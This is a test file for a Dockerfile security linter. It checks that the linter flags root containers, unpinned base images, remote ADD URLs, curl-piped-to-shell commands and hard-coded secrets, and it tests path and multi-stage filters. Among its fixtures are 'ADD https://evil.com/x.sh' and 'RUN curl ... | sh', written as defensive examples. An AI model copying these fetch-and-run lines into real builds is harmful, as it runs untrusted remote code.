import { describe, it, expect } from 'vitest';
import { lintDockerfile, isDockerfilePath, looksLikeDockerfile } from './dockerfile';

const has = (fs: ReturnType<typeof lintDockerfile>, re: RegExp) => fs.some((f) => re.test(f.label));

describe('lintDockerfile', () => {
  it('flags a container with no USER (runs as root)', () => {
    const fs = lintDockerfile('FROM node:20-alpine\nCOPY . .\nCMD ["node","x"]');
    expect(has(fs, /runs as root/i)).toBe(true);
  });

  it('does NOT flag when a non-root USER is set last', () => {
    const fs = lintDockerfile('FROM node:20-alpine\nUSER node\nCMD ["node","x"]');
    expect(has(fs, /runs as root/i)).toBe(false);
  });

  it('flags an unpinned base image, not a pinned one', () => {
    expect(has(lintDockerfile('FROM node:latest\nUSER node'), /base image not pinned/i)).toBe(true);
    expect(has(lintDockerfile('FROM node\nUSER node'), /base image not pinned/i)).toBe(true);
    expect(has(lintDockerfile('FROM node:20.11.0-alpine\nUSER node'), /base image not pinned/i)).toBe(false);
    expect(has(lintDockerfile('FROM scratch\nUSER 1000'), /base image not pinned/i)).toBe(false);
  });

  it('flags ADD from a URL and curl|sh, but not ordinary RUN', () => {
    expect(has(lintDockerfile('FROM x:1\nUSER n\nADD https://evil.com/x.sh /x'), /remote URL/i)).toBe(true);
    expect(has(lintDockerfile('FROM x:1\nUSER n\nRUN curl -fsSL https://get.example.com | sh'), /straight to a shell/i)).toBe(true);
    expect(has(lintDockerfile('FROM x:1\nUSER n\nRUN npm ci'), /remote URL|shell/i)).toBe(false);
  });

  it('flags a secret baked into the Dockerfile', () => {
    const key = 'sk' + '_live_' + 'A'.repeat(24);
    expect(has(lintDockerfile(`FROM x:1\nUSER n\nENV STRIPE=${key}`), /hard-coded in the Dockerfile/i)).toBe(true);
  });

  it('a well-formed Dockerfile passes clean', () => {
    const df = 'FROM node:20.11.0-alpine\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --omit=dev\nCOPY . .\nUSER node\nCMD ["node","server.js"]';
    expect(lintDockerfile(df)).toEqual([]);
  });
});

describe('isDockerfilePath — the filter that graded our own repo F', () => {
  it('does NOT match this scanner’s own source or its tests', () => {
    // The original regex matched these case-insensitively as "Dockerfile.<ext>",
    // so the linter ran over its own pattern definitions and reported four
    // container findings that do not exist.
    expect(isDockerfilePath('lib/scan/dockerfile.ts')).toBe(false);
    expect(isDockerfilePath('lib/scan/dockerfile.test.ts')).toBe(false);
    expect(isDockerfilePath('app/dockerfile.py')).toBe(false);
  });

  it('does not match documentation about Dockerfiles', () => {
    expect(isDockerfilePath('docs/Dockerfile.md')).toBe(false);
    expect(isDockerfilePath('Dockerfile.txt')).toBe(false);
  });

  it('matches real Dockerfiles, including the two naming conventions', () => {
    expect(isDockerfilePath('Dockerfile')).toBe(true);
    expect(isDockerfilePath('docker/Dockerfile')).toBe(true);
    expect(isDockerfilePath('Dockerfile.prod')).toBe(true);
    expect(isDockerfilePath('docker/Dockerfile.dev')).toBe(true);
    // The old regex MISSED this one entirely.
    expect(isDockerfilePath('prod.Dockerfile')).toBe(true);
  });
});

describe('looksLikeDockerfile — the content gate', () => {
  it('requires the one mandatory instruction', () => {
    expect(looksLikeDockerfile('FROM node:20-alpine\nRUN npm ci')).toBe(true);
    expect(looksLikeDockerfile('# syntax=docker/dockerfile:1\nARG V=20\nFROM node:${V}')).toBe(true);
    expect(looksLikeDockerfile('  from node:20')).toBe(true); // case + indent tolerant
  });

  it('rejects a file that merely mentions Dockerfile things', () => {
    expect(looksLikeDockerfile("const RUN_AS_ROOT = /^USER\s+root/;")).toBe(false);
    expect(looksLikeDockerfile('This guide explains USER and RUN instructions.')).toBe(false);
  });
});

describe('multi-stage builds are not unpinned base images', () => {
  const MULTISTAGE = `FROM node:20-alpine AS builder
WORKDIR /app
RUN npm ci
FROM builder AS deps
RUN npm prune --omit=dev
FROM node:20-alpine
COPY --from=builder /app /app
USER node`;

  it('does not flag a stage reference as an untagged image', () => {
    // `FROM builder` is an earlier stage, and Docker resolves stage names in
    // preference to registry images. Reading them as images failed every
    // multi-stage Dockerfile — which is most real ones.
    const pins = lintDockerfile(MULTISTAGE).filter((f) => f.label === 'Base image not pinned');
    expect(pins).toHaveLength(0);
  });

  it('still catches a genuinely unpinned base image', () => {
    expect(lintDockerfile('FROM node\nUSER node').some((f) => f.label === 'Base image not pinned')).toBe(true);
    expect(lintDockerfile('FROM node:latest\nUSER node').some((f) => f.label === 'Base image not pinned')).toBe(true);
  });

  it('treats a build ARG as pinned-by-argument, not unpinned', () => {
    const f = lintDockerfile('ARG NODE_VERSION=20\nFROM ${NODE_VERSION}\nUSER node');
    expect(f.some((x) => x.label === 'Base image not pinned')).toBe(false);
  });

  it('ignores flags that precede the image name', () => {
    const f = lintDockerfile('FROM --platform=linux/amd64 node:20-alpine AS b\nUSER node');
    expect(f.some((x) => x.label === 'Base image not pinned')).toBe(false);
  });
});
